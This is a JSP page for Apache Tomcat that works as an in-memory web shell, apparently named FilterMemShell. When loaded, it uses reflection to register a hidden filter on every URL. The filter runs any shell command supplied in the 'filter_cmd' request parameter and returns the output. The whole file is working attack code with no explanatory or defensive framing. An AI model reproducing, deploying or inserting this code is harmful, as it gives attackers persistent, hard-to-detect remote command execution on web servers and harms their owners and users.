<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<%@ page import="java.io.IOException"%>
<%@ page import="javax.servlet.DispatcherType"%>
<%@ page import="javax.servlet.Filter"%>
<%@ page import="javax.servlet.FilterChain"%>
<%@ page import="javax.servlet.FilterConfig"%>
<%@ page import="javax.servlet.FilterRegistration"%>
<%@ page import="javax.servlet.ServletContext"%>
<%@ page import="javax.servlet.ServletException"%>
<%@ page import="javax.servlet.ServletRequest"%>
<%@ page import="javax.servlet.ServletResponse"%>
<%@ page import="javax.servlet.annotation.WebServlet"%>
<%@ page import="javax.servlet.http.HttpServlet"%>
<%@ page import="javax.servlet.http.HttpServletRequest"%>
<%@ page import="javax.servlet.http.HttpServletResponse"%>
<%@ page import="org.apache.catalina.core.ApplicationContext"%>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig"%>
<%@ page import="org.apache.catalina.core.StandardContext"%>
<%@ page import="org.apache.tomcat.util.descriptor.web.*"%>
<%@ page import="org.apache.catalina.Context"%>
<%@ page import="java.lang.reflect.*"%>
<%@ page import="java.util.EnumSet"%>
<%@ page import="java.util.Map"%>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.PrintWriter" %>


<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Insert title here</title>
</head>
<body>
<%
    final String filterName = "filter";

    ServletContext ctx = request.getSession().getServletContext();
    Field f = ctx.getClass().getDeclaredField("context");
    f.setAccessible(true);
    ApplicationContext appCtx = (ApplicationContext)f.get(ctx);

    f = appCtx.getClass().getDeclaredField("context");
    f.setAccessible(true);
    StandardContext standardCtx = (StandardContext)f.get(appCtx);


    f = standardCtx.getClass().getDeclaredField("filterConfigs");
    f.setAccessible(true);
    Map filterConfigs = (Map)f.get(standardCtx);

    if (filterConfigs.get(filterName) == null) {
        out.println("inject "+ filterName);

        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig arg0) throws ServletException {
                // TODO Auto-generated method stub
            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
                    throws IOException, ServletException {
                // TODO Auto-generated method stub
                System.out.println("[INFO] FilterMemShell 收到一次filter拦截...");
                HttpServletRequest req = (HttpServletRequest)servletRequest;
                String cmd = req.getParameter("filter_cmd");
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                PrintWriter out = servletResponse.getWriter();
                out.println(output);
                out.flush();
                out.close();
                filterChain.doFilter(servletRequest, servletResponse);
            }

            @Override
            public void destroy() {
                // TODO Auto-generated method stub
            }
        };

        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(filterName);
        filterDef.setFilterClass(filter.getClass().getName());
        filterDef.setFilter(filter);

        standardCtx.addFilterDef(filterDef);

        FilterMap m = new FilterMap();
        m.setFilterName(filterDef.getFilterName());
        m.setDispatcher(DispatcherType.REQUEST.name());
        m.addURLPattern("/*");

        standardCtx.addFilterMapBefore(m);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        FilterConfig filterConfig = (FilterConfig)constructor.newInstance(standardCtx, filterDef);


        filterConfigs.put(filterName, filterConfig);

        out.println("injected");
    }
%>
</body>
</html>